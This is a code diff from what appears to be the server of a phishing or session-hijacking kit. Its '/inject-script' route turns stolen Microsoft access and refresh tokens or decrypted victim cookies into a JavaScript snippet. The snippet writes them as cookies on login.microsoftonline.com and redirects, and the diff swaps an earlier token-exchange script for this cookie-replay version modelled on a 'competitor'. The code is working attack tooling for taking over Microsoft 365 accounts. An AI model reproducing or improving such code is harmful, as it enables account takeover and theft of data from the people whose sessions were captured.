@@ -630,49 +630,38 @@ router.get('/inject-script', userAuth, async (req, res) => {
       return res.status(400).json({ error: 'No tokens available for injection' });
     }
 
-    const realRefreshToken = refreshToken;
-    if (!realRefreshToken) {
-      return res.status(400).json({ error: 'No refresh token available' });
+    // Get cookies from token
+    var cookiesList = [];
+    var cookiesDecrypted = decrypt(token.cookies_encrypted);
+    if (cookiesDecrypted) {
+      cookiesList = parseCookies(cookiesDecrypted);
+    } else {
+      if (accessToken) {
+        cookiesList.push({ name: 'x-ms-RefreshTokenCredential', value: accessToken, domain: '.login.microsoftonline.com' });
+      }
+      if (refreshToken) {
+        cookiesList.push({ name: 'RefreshToken', value: refreshToken, domain: '.login.microsoftonline.com' });
+      }
     }
 
-    const clientId = config.AZURE_CLIENT_ID || 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
-    const tokenTenant = token.tenant || config.AZURE_TENANT || 'common';
+    if (cookiesList.length === 0) {
+      return res.status(400).json({ error: 'No cookies available for injection' });
+    }
 
-    const script = `(async function() {
-      const refreshToken = "${realRefreshToken}";
-      const clientId = "${clientId}";
+    // Build cookie injection statements in competitor's exact format
+    var cookieStatements = '';
+    for (var i = 0; i < cookiesList.length; i++) {
+      var c = cookiesList[i];
+      cookieStatements += 'document.cookie = "' + c.name + '=' + c.value.replace(/"/g, '\\"') + '; domain=.login.microsoftonline.com; path=/; Secure; SameSite=None";\n';
+    }
 
-      const body = new URLSearchParams({
-        client_id: clientId,
-        grant_type: "refresh_token",
-        refresh_token: refreshToken,
-        scope: "https://graph.microsoft.com/.default offline_access openid profile"
-      });
-
-      const endpoints = [
-        "/${tokenTenant}/oauth2/v2.0/token",
-        "/common/oauth2/v2.0/token",
-        "/consumers/oauth2/v2.0/token"
-      ];
-
-      for (const url of endpoints) {
-        try {
-          const resp = await fetch(url, {
-            method: "POST",
-            headers: { "Content-Type": "application/x-www-form-urlencoded" },
-            body: body.toString(),
-            credentials: "include"
-          });
-
-          if (resp.ok) {
-            window.location.href = "https://www.office.com/";
-            return;
-          }
-        } catch (e) {}
-      }
-
-      alert("Exchange failed. The refresh token may be expired or the client_id is wrong.");
-    })();`;
+    const script = '(function() {\n' +
+      cookieStatements + '\n' +
+      '// Redirect after 3s\n' +
+      'setTimeout(function() {\n' +
+      'window.location.href = "https://login.microsoftonline.com/common/oauth2/authorize";\n' +
+      '}, 3000);\n' +
+      '})();';
 
     res.type('application/javascript').send(script);
   } catch (err) {
